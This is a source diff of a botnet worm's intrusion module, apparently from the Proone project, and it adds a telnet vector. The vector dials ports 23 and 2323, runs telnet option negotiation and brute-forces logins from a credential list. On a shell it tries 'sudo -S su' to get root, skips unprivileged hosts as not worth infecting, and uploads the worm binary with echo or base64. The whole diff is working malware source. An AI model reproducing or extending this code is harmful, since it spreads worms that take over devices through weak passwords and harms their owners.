@@ -18,8 +18,8 @@
 #include <mbedtls/base64.h>
 
 
-static const struct timespec BNE_CONN_OP_TIMEOUT = { 60, 0 }; // 1m
-static const struct timespec BNE_SCK_OP_TIMEOUT = { 30, 0 }; // 10s
+static const struct timespec BNE_CONN_OP_TIMEOUT = { 30, 0 }; // 30s
+static const struct timespec BNE_SCK_OP_TIMEOUT = { 10, 0 }; // 10s
 static const struct timespec BNE_CLOSE_OP_TIMEOUT = { 1, 0 }; // 1s
 static const struct timespec BNE_ERR_PAUSE = { 0, 500000000 }; // 500ms
 static const struct timespec BNE_PROMPT_PAUSE = { 4, 0 }; // 4s
@@ -59,9 +59,14 @@ typedef struct {
 } bne_vssh_ctx_t;
 
 typedef struct {
+	char *prompt_line;
+	size_t prompt_line_len;
+	uint8_t *m_lefto;
+	uint8_t *ptr_lefto;
+	size_t lefto_len;
 	int fd;
 	prne_llist_t ports;
-} bne_vtelnet_ctx_t;
+} bne_vtn_ctx_t;
 
 typedef unsigned int bne_avail_cmds_t;
 
@@ -97,7 +102,9 @@ typedef struct {
 	prne_llist_t up_methods; // series of pointer to upload functions
 	prne_bin_rcb_ctx_t rcb;
 	bne_avail_cmds_t avail_cmds;
+	char stx_out[53];
 	char stx_str[37];
+	char eot_out[53];
 	char eot_str[37];
 } bne_sh_ctx_t;
 
@@ -122,11 +129,51 @@ static void bne_init_sh_ctx (bne_sh_ctx_t *p, prne_rnd_t *rnd) {
 		memset(uuid, 0xAA, 16);
 	}
 	prne_uuid_tostr(uuid, p->stx_str);
+	sprintf(
+		p->stx_out,
+		"%02x%02x%02x%02x\\\\x2D%02x%02x\\\\x2D%02x%02x\\\\x2D%02x%02x"
+		"\\\\x2D%02x%02x%02x%02x%02x%02x",
+		uuid[0],
+		uuid[1],
+		uuid[2],
+		uuid[3],
+		uuid[4],
+		uuid[5],
+		uuid[6],
+		uuid[7],
+		uuid[8],
+		uuid[9],
+		uuid[10],
+		uuid[11],
+		uuid[12],
+		uuid[13],
+		uuid[14],
+		uuid[15]);
 
 	if (!prne_rnd(rnd, uuid, 16)) {
 		memset(uuid, 0xBB, 16);
 	}
 	prne_uuid_tostr(uuid, p->eot_str);
+	sprintf(
+		p->eot_out,
+		"%02x%02x%02x%02x\\\\x2D%02x%02x\\\\x2D%02x%02x\\\\x2D%02x%02x"
+		"\\\\x2D%02x%02x%02x%02x%02x%02x",
+		uuid[0],
+		uuid[1],
+		uuid[2],
+		uuid[3],
+		uuid[4],
+		uuid[5],
+		uuid[6],
+		uuid[7],
+		uuid[8],
+		uuid[9],
+		uuid[10],
+		uuid[11],
+		uuid[12],
+		uuid[13],
+		uuid[14],
+		uuid[15]);
 }
 
 static void bne_free_sh_ctx (bne_sh_ctx_t *p) {
@@ -395,6 +442,9 @@ static bool bne_do_connect (
 			errno = sov;
 		}
 	}
+	else {
+		// Interrupted by signal? too bad.
+	}
 
 ERR:
 	prne_close(*fd);
@@ -476,7 +526,7 @@ static bool bne_sh_send (
 
 	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0 + 3) {
 		prne_dbgpf(
-			"bne@%"PRIxPTR"\t: bne_sh_send():\n%s\n",
+			"bne sh@%"PRIxPTR"\t: bne_sh_send():\n%s\n",
 			(uintptr_t)s_ctx->ctx,
 			cmdline);
 	}
@@ -491,10 +541,10 @@ static bool bne_sh_send (
 
 static char *bne_sh_mknexted_cmd (bne_sh_ctx_t *s_ctx, const char *cmd) {
 	const char *sb[] = {
-		"echo -n ", s_ctx->stx_str, ";\\", s_ctx->nl,
+		"echo -ne ", s_ctx->stx_out, ";\\", s_ctx->nl,
 		cmd, // terminator supplied by caller
 		"\\", s_ctx->nl,
-		"echo -n ", s_ctx->eot_str, s_ctx->nl
+		"echo -ne ", s_ctx->eot_out, s_ctx->nl
 	};
 
 	return prne_build_str(sb, sizeof(sb)/sizeof(const char*));
@@ -710,7 +760,7 @@ static int bne_sh_get_uid (bne_sh_ctx_t *s_ctx) {
 
 static bool bne_sh_sudo (prne_bne_t *ctx, bne_sh_ctx_t *s_ctx) {
 	const char *sb[] = {
-		"sudo -S su; echo -n ", s_ctx->eot_str, s_ctx->nl
+		"sudo -S su; echo -n ", s_ctx->eot_out, s_ctx->nl
 	};
 	bool ret = false;
 	ssize_t f_ret;
@@ -737,7 +787,9 @@ static bool bne_sh_sudo (prne_bne_t *ctx, bne_sh_ctx_t *s_ctx) {
 		prne_iobuf_shift(&s_ctx->ib, f_ret);
 	}
 
+	// timeout is a normal outcome!
 	if (pth_event_status(s_ctx->ev) != PTH_STATUS_OCCURRED) {
+		// read op has not timedout
 		ctx->result.err = errno;
 		goto END;
 	}
@@ -966,7 +1018,7 @@ static bool bne_sh_setup (
 		}
 	}
 
-	// Skip banner
+	// Skip motd
 	if (!s_ctx->flush_f(s_ctx->ctx)) {
 		goto END;
 	}
@@ -983,7 +1035,7 @@ static bool bne_sh_setup (
 		// Not root. Try escalating the shell
 		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
 			prne_dbgpf(
-				"bne@%"PRIxPTR"\t: broke in as uid %d. Trying sudo...\n",
+				"bne sh@%"PRIxPTR"\t: broke in as uid %d. Trying sudo...\n",
 				(uintptr_t)ctx,
 				uid);
 		}
@@ -992,7 +1044,7 @@ static bool bne_sh_setup (
 			// sudo failed. no point infecting unprivileged machine
 			if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_ERR) {
 				prne_dbgpf(
-					"bne@%"PRIxPTR"\t: sudo failed\n",
+					"bne sh@%"PRIxPTR"\t: sudo failed\n",
 					(uintptr_t)ctx);
 			}
 			goto END;
@@ -1017,7 +1069,7 @@ static bool bne_sh_setup (
 	}
 	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0 + 2) {
 		prne_dbgpf(
-			"bne@%"PRIxPTR"\t: available commands - ",
+			"bne sh@%"PRIxPTR"\t: available commands - ",
 			(uintptr_t)ctx);
 		if (s_ctx->avail_cmds & BNE_AVAIL_CMD_ECHO) {
 			prne_dbgpf("echo ");
@@ -1038,7 +1090,7 @@ static bool bne_sh_setup (
 	{
 		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_ERR) {
 			prne_dbgpf(
-				"bne@%"PRIxPTR"\t: echo and cat unavailable on this system\n",
+				"bne sh@%"PRIxPTR"\t: echo and cat unavailable on this system\n",
 				(uintptr_t)ctx);
 		}
 		ctx->result.err = ENOSYS;
@@ -1102,7 +1154,7 @@ static bool bne_sh_setup (
 	qsort(mp_arr, mp_cnt, sizeof(bne_mp_t), bne_mp_cmp_f);
 	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0 + 2) {
 		prne_dbgpf(
-			"bne@%"PRIxPTR"\t: suitable mount points:\n",
+			"bne sh@%"PRIxPTR"\t: suitable mount points:\n",
 			(uintptr_t)ctx);
 	}
 	for (size_t i = 0, j = mp_cnt - 1; i < mp_cnt; i += 1, j -= 1) {
@@ -1204,12 +1256,12 @@ static bool bne_sh_setup (
 
 		if (arch_str == NULL) {
 			prne_dbgpf(
-				"bne@%"PRIxPTR"\t: arch detection failed\n",
+				"bne sh@%"PRIxPTR"\t: arch detection failed\n",
 				(uintptr_t)ctx);
 		}
 		else {
 			prne_dbgpf(
-				"bne@%"PRIxPTR"\t: arch: %s\n",
+				"bne sh@%"PRIxPTR"\t: arch: %s\n",
 				(uintptr_t)ctx,
 				arch_str);
 		}
@@ -1257,7 +1309,7 @@ static bool bne_sh_start_rcb (prne_bne_t *ctx, bne_sh_ctx_t *sh_ctx) {
 		}
 		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
 			prne_dbgpf(
-				"bne@%"PRIxPTR"\t: retrying bin_rcb with compat arch %s\n",
+				"bne sh@%"PRIxPTR"\t: retrying bin_rcb with compat arch %s\n",
 				(uintptr_t)ctx,
 				prne_arch_tostr(ctx->result.arch));
 		}
@@ -1353,7 +1405,7 @@ static bool bne_sh_prep_upload (
 
 		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
 			prne_dbgpf(
-				"bne@%"PRIxPTR"\t: prep upload on %s\n",
+				"bne sh@%"PRIxPTR"\t: prep upload on %s\n",
 				(uintptr_t)ctx,
 				s_ctx->upload_dir);
 		}
@@ -1409,7 +1461,7 @@ static bool bne_sh_upload_echo (
 
 	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
 		prne_dbgpf(
-			"bne@%"PRIxPTR"\t: uploading using echo ...\n",
+			"bne sh@%"PRIxPTR"\t: uploading using echo ...\n",
 			(uintptr_t)ctx);
 	}
 
@@ -1500,7 +1552,7 @@ static bool bne_sh_upload_base64 (
 
 	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
 		prne_dbgpf(
-			"bne@%"PRIxPTR"\t: uploading using base64 ...\n",
+			"bne sh@%"PRIxPTR"\t: uploading using base64 ...\n",
 			(uintptr_t)ctx);
 	}
 
@@ -1739,7 +1791,6 @@ static bool bne_do_vec_htbt (prne_bne_t *ctx) {
 		goto END;
 	}
 
-	prne_pth_reset_timer(&ev, &BNE_CONN_OP_TIMEOUT);
 	if (!prne_mbedtls_pth_handle(&ssl, mbedtls_ssl_handshake, fd, ev)) {
 		goto END;
 	}
@@ -1765,9 +1816,781 @@ END: // CATCH
 /*******************************************************************************
                               Telnet Vector Impl
 *******************************************************************************/
+static const char BNE_VTN_NL[] = "\r\n";
+#define BNE_VTN_NL_LEN (sizeof(BNE_VTN_NL) - 1)
+
+static void bne_vtn_drop_conn (bne_vtn_ctx_t *t_ctx) {
+	prne_free(t_ctx->prompt_line);
+	t_ctx->prompt_line = NULL;
+	t_ctx->prompt_line_len = 0;
+	prne_free(t_ctx->m_lefto);
+	t_ctx->m_lefto = t_ctx->ptr_lefto = NULL;
+	t_ctx->lefto_len = 0;
+	prne_shutdown(t_ctx->fd, SHUT_RDWR);
+	prne_close(t_ctx->fd);
+	t_ctx->fd = -1;
+}
+
+/*
+*
+* 1: OK
+* 0: Format error
+* -1: errno set
+*/
+static int bne_vtn_parse_pdata (
+	const uint8_t *in_data,
+	const size_t in_len,
+	size_t *p_start,
+	size_t *p_len,
+	uint8_t **m_pout,
+	size_t *pout_len)
+{
+	uint8_t wont_buf[3];
+	bool iac = false;
+	uint8_t opt_code;
+	const uint8_t *m_snd = NULL;
+	size_t snd_len = 0;
+
+	for (*p_start = 0; *p_start < in_len; *p_start += 1) {
+		if (in_data[*p_start] == 255) {
+			iac = true;
+			break;
+		}
+	}
+
+	if (iac) {
+		*p_len = 2;
+	}
+	else {
+		*p_len = 0;
+		return 1;
+	}
+
+	if (*p_start + 1 >= in_len) {
+		return 1;
+	}
+
+	switch (in_data[*p_start + 1]) {
+	case 240: // SE
+		// SE without SB. This is a malformed command
+		return 0;
+	case 241: // NOP
+	case 242: // Synch
+	case 243: // Break
+	case 244: // IP
+	case 245: // AO
+	case 246: // AYT
+	case 247: // EC
+	case 248: // EL
+	case 249: // GA
+		return 1;
+	case 250: // SB
+	case 251: // WILL
+	case 252: // WONT
+	case 253: // DONT
+	case 254: // DO
+		// option code required
+		*p_len = 3;
+		if (*p_start + 2 >= in_len) {
+			return 1;
+		}
+		break;
+	default:
+		return 0;
+	}
+	opt_code = in_data[*p_start + 2];
+
+	switch (in_data[*p_start + 1]) {
+	case 250: // SB
+		// find the SE of this SB
+		for (size_t i = *p_start + 3; i < in_len; i += 1) {
+			if (in_data[i] == 255 && i + 1 < in_len) {
+				*p_len += 2;
+				if (in_data[i + 1] != 240) {
+					return 0;
+				}
+				// do something with this data
+				break;
+			}
+			else {
+				*p_len += 1;
+			}
+		}
+		break;
+	case 251: // WILL
+	case 252: // WONT
+	case 254: // DONT
+		break; // ignore
+	case 253: // DO
+		if (opt_code == 31) { // NAW
+			static const uint8_t DAT[] = {
+				// IAC WILL NAWS
+				255, 251, 31,
+				// IAC SB NAWS 0 80 0 24 IAC SE
+				255, 250, 31, 0, 80, 0, 24, 255, 240
+			};
+			m_snd = DAT;
+			snd_len = sizeof(DAT);
+		}
+		else {
+			// IAC WONT WHATEVER-IT-IS
+			wont_buf[0] = 255;
+			wont_buf[1] = 252;
+			wont_buf[2] = opt_code;
+			m_snd = wont_buf;
+			snd_len = 3;
+		}
+		break;
+	}
+
+	if (snd_len > 0) {
+		void *ny;
+
+		ny = prne_realloc(*m_pout, 1, snd_len);
+		if (ny == NULL) {
+			return -1;
+		}
+		*m_pout = (uint8_t*)ny;
+		*pout_len = snd_len;
+		memcpy(*m_pout, m_snd, snd_len);
+	}
+
+	return 1;
+}
+
+static bool bne_vtn_push_data (
+	struct pollfd *pfd,
+	const uint8_t *buf,
+	size_t len,
+	pth_event_t ev)
+{
+	ssize_t f_ret;
+
+	while (len > 0) {
+		pfd->events = POLLOUT;
+		f_ret = prne_pth_poll(pfd, 1, -1, ev);
+		if (f_ret <= 0) {
+			return false;
+		}
+
+		f_ret = write(pfd->fd, buf, len);
+		if (f_ret <= 0) {
+			return false;
+		}
+		buf += f_ret;
+		len -= f_ret;
+	}
+
+	return true;
+}
+
+static ssize_t bne_vtn_read_f (
+	void *ctx_p,
+	void *buf,
+	const size_t len,
+	pth_event_t ev)
+{
+	bne_vtn_ctx_t *ctx = (bne_vtn_ctx_t*)ctx_p;
+	struct pollfd pfd;
+	ssize_t f_ret;
+
+	if (ctx->lefto_len > 0) {
+		// if there's leftover data from handshake phase, return that
+		const size_t consume = prne_op_min(len, ctx->lefto_len);
+
+		memcpy(buf, ctx->ptr_lefto, consume);
+		ctx->ptr_lefto += consume;
+		ctx->lefto_len -= consume;
+
+		if (ctx->lefto_len == 0) {
+			prne_free(ctx->m_lefto);
+			ctx->m_lefto = ctx->ptr_lefto = NULL;
+		}
+
+		return consume;
+	}
+
+	pfd.fd = ctx->fd;
+	pfd.events = POLLIN;
+	f_ret = prne_pth_poll(&pfd, 1, -1, ev);
+	if (f_ret < 0) {
+		return -1;
+	}
+
+	return read(ctx->fd, buf, len);
+}
+
+static ssize_t bne_vtn_write_f (
+	void *ctx_p,
+	const void *buf,
+	const size_t len,
+	pth_event_t ev)
+{
+	bne_vtn_ctx_t *ctx = (bne_vtn_ctx_t*)ctx_p;
+	struct pollfd pfd;
+	ssize_t f_ret;
+	size_t rem = len, sent = 0;
+
+	pfd.fd = ctx->fd;
+	pfd.events = POLLOUT;
+
+	while (rem > 0) {
+		f_ret = prne_pth_poll(&pfd, 1, -1, ev);
+		if (f_ret < 0) {
+			return -1;
+		}
+
+		f_ret = write(ctx->fd, buf, rem);
+		if (f_ret < 0) {
+			return f_ret;
+		}
+		if (f_ret == 0) {
+			return sent;
+		}
+
+		buf = (const uint8_t*)buf + f_ret;
+		rem -= f_ret;
+		sent += f_ret;
+	}
+
+	return sent;
+}
+
+static bool bne_vtn_flush_f (void *ctx_p) {
+	bne_vtn_ctx_t *ctx = (bne_vtn_ctx_t*)ctx_p;
+	uint8_t buf[1024];
+	ssize_t f_ret;
+
+	while (true) {
+		f_ret = read(ctx->fd, buf, sizeof(buf));
+		if (f_ret < 0) {
+			if (errno == EAGAIN || errno == EWOULDBLOCK) {
+				return true;
+			}
+			return false;
+		}
+		if (f_ret == 0) {
+			return true;
+		}
+	}
+}
+
+static bool bne_vtn_handshake (bne_vtn_ctx_t *t_ctx, pth_event_t ev) {
+	static const size_t BUF_SIZE = 512;
+	static const uint8_t INIT_OUT[] = {
+		// IAC DO SUPPRESS-GO-AHEAD
+		255, 253, 3,
+		// IAC WILL NAWS
+		255, 251, 31
+	};
+	bool ret = false;
+	uint8_t *m_pout = NULL;
+	size_t pout_len = 0;
+	size_t p_start, p_len = 0, np_len;
+	uint8_t buf[BUF_SIZE];
+	prne_iobuf_t ib;
+	ssize_t f_ret;
+	struct pollfd pfd;
+
+	prne_init_iobuf(&ib);
+	prne_iobuf_setextbuf(&ib, buf, BUF_SIZE, 0);
+	pfd.fd = t_ctx->fd;
+
+// TRY
+	// send initial commands
+	if (!bne_vtn_push_data(&pfd, INIT_OUT, sizeof(INIT_OUT), ev)) {
+		goto END;
+	}
+
+	while (true) {
+		if (p_len > ib.len || ib.len == 0) {
+			// read data for the first time or
+			// read until no IAC is found in the stream
+			pfd.events = POLLIN;
+			f_ret = prne_pth_poll(&pfd, 1, -1, ev);
+			if (f_ret <= 0) {
+				goto END;
+			}
+
+			f_ret = read(pfd.fd, ib.m + ib.len, ib.avail);
+			if (f_ret <= 0) {
+				goto END;
+			}
+			prne_iobuf_shift(&ib, f_ret);
+		}
+
+		pout_len = 0;
+		f_ret = bne_vtn_parse_pdata(
+			ib.m,
+			ib.len,
+			&p_start,
+			&p_len,
+			&m_pout,
+			&pout_len);
+		if (f_ret <= 0) {
+			if (f_ret == 0) {
+				errno = EPROTO;
+			}
+			goto END;
+		}
+		if (p_len > ib.size) {
+			// need more buffer to process this command
+			errno = EPROTO;
+			goto END;
+		}
+
+		if (!bne_vtn_push_data(&pfd, m_pout, pout_len, ev)) {
+			goto END;
+		}
+
+		// save non-protocol data for later consumption
+		np_len = p_start;
+		if (np_len > 0) {
+			void *ny = prne_realloc(
+				t_ctx->m_lefto,
+				1,
+				t_ctx->lefto_len + np_len);
+
+			if (ny == NULL) {
+				goto END;
+			}
+			t_ctx->ptr_lefto = t_ctx->m_lefto = (uint8_t*)ny;
+			memcpy(t_ctx->m_lefto + t_ctx->lefto_len, ib.m, np_len);
+			t_ctx->lefto_len += np_len;
+		}
+		prne_iobuf_shift(&ib, -np_len);
+
+		if (p_len <= ib.len) {
+			// bne_vtn_parse_pdata() was able to consume some protocol data
+			prne_iobuf_shift(&ib, -p_len);
+		}
+		if (p_len == 0 && pout_len == 0) {
+			// IAC not found in the stream and no command produced
+			// end of telnet negotiation
+			ret = true;
+			break;
+		}
+	}
+
+END: // CATCH
+	prne_free_iobuf(&ib);
+	prne_free(m_pout);
+
+	return ret;
+}
+
+static bool bne_vtn_est_conn (prne_bne_t *ctx, bne_vtn_ctx_t *t_ctx) {
+	bool ret = false;
+	pth_event_t ev = NULL;
+	const struct timespec *pause = NULL;
+	prne_net_endpoint_t ep;
+
+	if (t_ctx->fd >= 0) {
+		return true;
+	}
+
+	ep.addr = ctx->param.subject;
+
+	while (t_ctx->ports.size > 0 &&
+		pth_event_status(ev) != PTH_STATUS_OCCURRED)
+	{
+		bne_port_t *p = (bne_port_t*)t_ctx->ports.head->element;
+
+		ep.port = p->port;
+
+		if (pause != NULL) {
+			pth_nanosleep(pause, NULL);
+			pause = NULL;
+		}
+		bne_vtn_drop_conn(t_ctx);
+		p->attempt += 1;
+
+		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0 + 1) {
+			prne_dbgpf(
+				"bne vtn@%"PRIxPTR"\t: knocking %"PRIu16"\n",
+				(uintptr_t)ctx,
+				p->port);
+		}
+
+		prne_pth_reset_timer(&ev, &BNE_CONN_OP_TIMEOUT);
+		if (!bne_do_connect(&t_ctx->fd, &ep, ev)) {
+			ctx->result.err = errno;
+			goto END;
+		}
+		if (t_ctx->fd < 0) {
+			pause = &BNE_ERR_PAUSE;
+			if (p->attempt >= BNE_CONN_ATTEMPT) {
+				goto POP;
+			}
+			continue;
+		}
+
+		if (bne_vtn_handshake(t_ctx, ev)) {
+			ctx->result.err = 0;
+			ret = true;
+			break;
+		}
+		else {
+			if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
+				prne_dbgpf(
+					"bne vtn@%"PRIxPTR"\t: handshake failed on port "
+					"%"PRIu16"\n",
+					(uintptr_t)ctx,
+					ep.port);
+			}
+		}
+		/* fall-through */
+POP:
+		// try next port
+		prne_free(p);
+		prne_llist_erase(&t_ctx->ports, t_ctx->ports.head);
+	}
+
+END:
+	if (ev != NULL && pth_event_status(ev) == PTH_STATUS_OCCURRED) {
+		ctx->result.err = ETIMEDOUT;
+	}
+	pth_event_free(ev, FALSE);
+	if (!ret) {
+		bne_vtn_drop_conn(t_ctx);
+	}
+
+	return ret;
+}
+
+/*
+*
+* This function only works against conventional /bin/login program.
+* We assume that "conventional" /bin/login has following prompt structure:
+*
+*	[hostname ]login:
+*	Password:
+*	Login incorrect
+*
+* This functions will not work against login prompt structure other than this.
+*
+* Return:
+*	1: successful login
+*	0: unsuccessful login
+*	-1: IO error. Re-establish connection and keep trying!
+*/
+static int bne_vtn_try_cred (
+	prne_bne_t *ctx,
+	bne_vtn_ctx_t *t_ctx,
+	pth_event_t ev)
+{
+	static const char LOGIN_P[] = "login:";
+	static const char PWD_P[] = "password:";
+	static const char INC_P[] = "incorrect";
+#define LOGIN_P_LEN (sizeof(LOGIN_P) - 1)
+#define PWD_P_LEN (sizeof(LOGIN_P) - 1)
+#define INC_P_LEN (sizeof(INC_P) - 1)
+	int ret = -1;
+	char *prompt_nl[3];
+	char *p_login, *p_line, *ib_end;
+	uint8_t buf[2048];
+	prne_iobuf_t ib;
+	ssize_t f_ret;
+	size_t len;
+
+	prne_init_iobuf(&ib);
+	prne_iobuf_setextbuf(&ib, buf, sizeof(buf), 0);
+
+	// sync login prompt
+	prne_iobuf_reset(&ib);
+	while (true) {
+		f_ret = bne_vtn_read_f(t_ctx, ib.m + ib.len, ib.avail, ev);
+		if (f_ret <= 0) {
+			goto END;
+		}
+		prne_transmem(ib.m + ib.len, f_ret, tolower);
+		prne_iobuf_shift(&ib, f_ret);
+
+		if (t_ctx->prompt_line == NULL) {
+			p_login = (char*)prne_memrmem(
+				ib.m,
+				ib.len,
+				LOGIN_P,
+				LOGIN_P_LEN);
+			if (p_login == NULL) {
+				continue;
+			}
+			len = p_login - (char*)ib.m;
+
+			prompt_nl[0] = (char*)prne_memrchr(ib.m, '\r', len);
+			prompt_nl[1] = (char*)prne_memrchr(ib.m, '\n', len);
+			prompt_nl[2] = (char*)prne_memrchr(ib.m, '\0', len);
+			if (prompt_nl[0] != NULL || prompt_nl[1] != NULL) {
+				// newline char found
+				if (prompt_nl[0] + 1 == prompt_nl[1]) {
+					// CrLf
+					p_line = prompt_nl[1] + 1;
+				}
+				else if (prompt_nl[0] + 1 == prompt_nl[2]) {
+					// CrNul
+					p_line = prompt_nl[2] + 1;
+				}
+				else {
+					p_line = prne_op_max(prompt_nl[0], prompt_nl[1]) + 1;
+				}
+			}
+			else {
+				p_line = (char*)ib.m;
+			}
+
+			// trailing characters must be whitespaces
+			ib_end = (char*)ib.m + ib.len;
+			for (char *i = p_login + LOGIN_P_LEN; i < ib_end; i += 1) {
+				if (!isspace(*i)) {
+					continue;
+				}
+			}
+
+			// copy the prompt line for later use
+			len = ib_end - p_line;
+			t_ctx->prompt_line = prne_alloc_str(len);
+			if (t_ctx->prompt_line != NULL) {
+				t_ctx->prompt_line_len = len;
+				memcpy(t_ctx->prompt_line, p_line, len);
+				t_ctx->prompt_line[len] = 0;
+			}
+		}
+		else if (prne_memmem(
+			ib.m,
+			ib.len,
+			t_ctx->prompt_line,
+			t_ctx->prompt_line_len) == NULL)
+		{
+			continue;
+		}
+
+		break;
+	}
+
+	// send ID
+	len = strlen(ctx->result.cred.id);
+	if (bne_vtn_write_f(t_ctx, ctx->result.cred.id, len, ev) != (ssize_t)len) {
+		goto END;
+	}
+	// send nl
+	if (bne_vtn_write_f(
+		t_ctx,
+		BNE_VTN_NL,
+		BNE_VTN_NL_LEN,
+		ev) != (ssize_t)BNE_VTN_NL_LEN)
+	{
+		goto END;
+	}
+
+	// sync password prompt
+	prne_iobuf_reset(&ib);
+	while (true) {
+		f_ret = bne_vtn_read_f(t_ctx, ib.m + ib.len, ib.avail, ev);
+		if (f_ret <= 0) {
+			goto END;
+		}
+		prne_transmem(ib.m + ib.len, f_ret, tolower);
+		prne_iobuf_shift(&ib, f_ret);
+
+		if (prne_memmem(ib.m, ib.len, PWD_P, PWD_P_LEN) != NULL) {
+			break;
+		}
+		else if (memchr(ib.m, '>', ib.len) != NULL ||
+			memchr(ib.m, '$', ib.len) != NULL ||
+			memchr(ib.m, '#', ib.len) != NULL ||
+			memchr(ib.m, '%', ib.len) != NULL ||
+			memchr(ib.m, ':', ib.len) != NULL)
+		{
+			// password not prompted
+			ret = 1;
+			goto END;
+		}
+	}
+
+	// send PW
+	len = strlen(ctx->result.cred.pw);
+	if (bne_vtn_write_f(t_ctx, ctx->result.cred.pw, len, ev) != (ssize_t)len) {
+		goto END;
+	}
+	// send nl
+	if (bne_vtn_write_f(
+		t_ctx,
+		BNE_VTN_NL,
+		BNE_VTN_NL_LEN,
+		ev) != (ssize_t)BNE_VTN_NL_LEN)
+	{
+		goto END;
+	}
+
+	// sync answer
+	prne_iobuf_reset(&ib);
+	while (true) {
+		f_ret = bne_vtn_read_f(t_ctx, ib.m + ib.len, ib.avail, ev);
+		if (f_ret <= 0) {
+			goto END;
+		}
+		prne_transmem(ib.m + ib.len, f_ret, tolower);
+		prne_iobuf_shift(&ib, f_ret);
+
+		if (prne_memmem(ib.m, ib.len, INC_P, INC_P_LEN) != NULL ||
+			prne_memmem(
+				ib.m,
+				ib.len,
+				t_ctx->prompt_line,
+				t_ctx->prompt_line_len) != NULL)
+		{
+			// feed the read data back to the stream...
+			// if it doesn't look good to you, too bad
+			prne_free(t_ctx->m_lefto);
+			t_ctx->m_lefto = t_ctx->ptr_lefto =
+				(uint8_t*)prne_malloc(1, ib.len);
+			if (t_ctx->m_lefto == NULL) {
+				t_ctx->lefto_len = 0;
+				ret = -1;
+				break;
+			}
+			memcpy(t_ctx->m_lefto, ib.m, ib.len);
+			t_ctx->lefto_len = ib.len;
+
+			ret = 0;
+			break;
+		}
+		else if (memchr(ib.m, '>', ib.len) != NULL ||
+			memchr(ib.m, '$', ib.len) != NULL ||
+			memchr(ib.m, '#', ib.len) != NULL ||
+			memchr(ib.m, '%', ib.len) != NULL ||
+			memchr(ib.m, ':', ib.len) != NULL)
+		{
+			ret = 1;
+			break;
+		}
+	}
+
+END:
+	prne_free_iobuf(&ib);
+
+	return ret;
+#undef LOGIN_P_LEN
+#undef PWD_P_LEN
+#undef INC_P_LEN
+}
+
+static bool bne_vtn_login (prne_bne_t *ctx, bne_vtn_ctx_t *t_ctx) {
+	bool ret = false;
+	pth_event_t ev = NULL;
+	int f_ret;
+
+	while (true) {
+		if (!bne_vtn_est_conn(ctx, t_ctx)) {
+			break;
+		}
+
+		if (ctx->result.cred.id == NULL || ctx->result.cred.pw == NULL) {
+			if (!bne_pop_cred(ctx, false)) {
+				break;
+			}
+		}
+
+		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0 + 1) {
+			prne_dbgpf(
+				"bne vssh@%"PRIxPTR"\t: trying cred %s %s\n",
+				(uintptr_t)ctx,
+				ctx->result.cred.id,
+				ctx->result.cred.pw);
+		}
+
+		prne_pth_reset_timer(&ev, &BNE_SCK_OP_TIMEOUT);
+		f_ret = bne_vtn_try_cred(ctx, t_ctx, ev);
+		if (f_ret < 0) {
+			bne_vtn_drop_conn(t_ctx);
+			continue;
+		}
+		else if (f_ret == 0) {
+			bne_free_result_cred(ctx);
+			continue;
+		}
+
+		ret = true;
+		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
+			prne_dbgpf(
+				"bne vssh@%"PRIxPTR"\t: authenticated using cred %s %s\n",
+				(uintptr_t)ctx,
+				ctx->result.cred.id,
+				ctx->result.cred.pw);
+		}
+		break;
+	}
+
+	pth_event_free(ev, FALSE);
+	return ret;
+}
+
+static bool bne_vtn_do_shell (prne_bne_t *ctx, bne_vtn_ctx_t *t_ctx) {
+	bne_sh_ctx_t sh_ctx;
+	bool ret;
+
+	bne_init_sh_ctx(&sh_ctx, &ctx->rnd);
+	sh_ctx.ctx = t_ctx;
+	sh_ctx.read_f = bne_vtn_read_f;
+	sh_ctx.write_f = bne_vtn_write_f;
+	sh_ctx.flush_f = bne_vtn_flush_f;
+	sh_ctx.nl = "\r\n";
+
+	ret = bne_do_shell(ctx, &sh_ctx);
+
+	bne_free_sh_ctx(&sh_ctx);
+	return ret;
+}
+
 static bool bne_do_vec_telnet (prne_bne_t *ctx) {
-	// TODO
-	return false;
+	static const uint16_t SSH_PORTS[] = { 23, 2323 };
+	bool ret = false;
+	bne_vtn_ctx_t vtn_ctx;
+
+	prne_memzero(&vtn_ctx, sizeof(bne_vtn_ctx_t));
+	vtn_ctx.fd = -1;
+	prne_init_llist(&vtn_ctx.ports);
+
+	bne_free_result_cred(ctx);
+
+	for (size_t i = 0; i < sizeof(SSH_PORTS)/sizeof(uint16_t); i += 1) {
+		bne_port_t *p = prne_calloc(sizeof(bne_port_t), 1);
+
+		if (p == NULL) {
+			ctx->result.err = errno;
+			goto END;
+		}
+		p->port = SSH_PORTS[i];
+
+		if (!prne_llist_append(
+			&vtn_ctx.ports,
+			(prne_llist_element_t)p))
+		{
+			prne_free(p);
+			ctx->result.err = errno;
+			goto END;
+		}
+	}
+
+	if (!bne_build_cred_set(ctx)) {
+		ctx->result.err = errno;
+		goto END;
+	}
+
+	if (!bne_vtn_login(ctx, &vtn_ctx)) {
+		goto END;
+	}
+
+	ret = bne_vtn_do_shell(ctx, &vtn_ctx);
+
+END:
+	bne_vtn_drop_conn(&vtn_ctx);
+	for (prne_llist_entry_t *e = vtn_ctx.ports.head; e != NULL; e = e->next) {
+		prne_free((void*)e->element);
+	}
+	prne_free_llist(&vtn_ctx.ports);
+
+	return ret;
 }
 
 /*******************************************************************************
@@ -1814,7 +2637,6 @@ static bool bne_vssh_est_sshconn (prne_bne_t *ctx, bne_vssh_ctx_t *vs) {
 
 	ep.addr = ctx->param.subject;
 
-	prne_pth_reset_timer(&ev, &BNE_CONN_OP_TIMEOUT);
